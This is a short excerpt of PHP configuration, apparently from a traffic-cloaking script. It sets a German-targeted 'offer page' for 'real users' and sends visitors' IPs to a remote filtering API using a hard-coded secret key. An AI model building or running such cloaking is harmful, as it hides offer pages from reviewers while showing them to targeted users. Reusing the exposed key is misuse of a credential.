...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://www.museendeutschlands.com/newgermany_oferwall/index.html';//PHP/HTML file or URL offer used for real users
...
$HCSET['FILTER_GEO_LIST'] = 'DE'; // string([2Chars country codes])
...
$HCSET['API_SECRET_KEY'] = 'v15a4f11be65764197b449a6f94d8ca0ae';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-423821787&js=false&stage='.$HCSET['stage'];
